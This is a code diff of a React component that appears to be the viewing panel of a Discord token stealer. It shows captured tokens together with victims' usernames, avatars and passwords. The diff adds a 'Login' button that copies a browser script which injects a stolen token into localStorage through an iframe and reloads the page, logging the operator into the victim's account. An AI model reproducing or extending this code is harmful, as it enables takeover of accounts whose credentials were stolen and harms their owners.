@@ -2,23 +2,49 @@ import { useState, useEffect } from 'react';
 import axios from 'axios';
 import dayjs from 'dayjs';
 
-const UserCard = ({token, userUsername, userDiscriminator, userAvatar, userBio, password, date}) => {
+const UserCard = ({token, userUsername, userDiscriminator, userAvatar, userBio, password, date, invalid}) => {
 	
 	const copyToken = (tk) => {
 		navigator.clipboard.writeText(tk);
 	}
 
+	const copyScript = (tk) => {
+		navigator.clipboard.writeText(`
+			function login(token) {
+		    	setInterval(() => {
+		      		document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`
+		    	}, 50);
+		    	setTimeout(() => {
+		      		location.reload();
+		    	}, 2500);
+		  	}
+			login('${tk}')
+	`);
+	}
 	return (
-		<div className="token-card" onClick={() => copyToken(token)}>
-			<span className="token-info">{token}</span>
+		<div className="token-card">
+			<span className="token-info">
+				{
+					!invalid ?
+					token.slice(0, 30) + "..."
+					: token
+				}
+			</span>
 			<div className="token-card-header">
 				<img
 					alt={userUsername + "#" + userDiscriminator} 
 					src={userAvatar} 
 				/>
-
+				{
+					!invalid ?
+					<span>
+						<button className="login-token-button" onClick={() => copyScript(token)}>
+							Login
+						</button>
+					</span> : ""
+				}
 			</div>
-			<div className="token-card-body">
+			<div className="token-card-body" onClick={() => copyToken(token)}>
 				<h3>
 					<span>{userUsername}</span>
 					#{userDiscriminator}
@@ -60,7 +86,7 @@ const GotTokens = ({token, date, password, username}) => {
 		{
 			user ? 
 				<UserCard 
-					token={token.slice(0, 30) + "..."}
+					token={token}
 					userUsername={user.username}
 					userDiscriminator={user.discriminator}
 					userAvatar={user.avatar ? 
@@ -71,6 +97,7 @@ const GotTokens = ({token, date, password, username}) => {
 					password={password !== null ? password : "Nope"}
 					date={date}
 					username={user.username}
+
 				/>
 			: 	
 				<UserCard 
@@ -81,6 +108,7 @@ const GotTokens = ({token, date, password, username}) => {
 					userBio={"No se ha podido cargar a este usuario"}
 					password={password !== null ? password : "Nope"}
 					date={date}
+					invalid
 				/>
 		}
 		</>
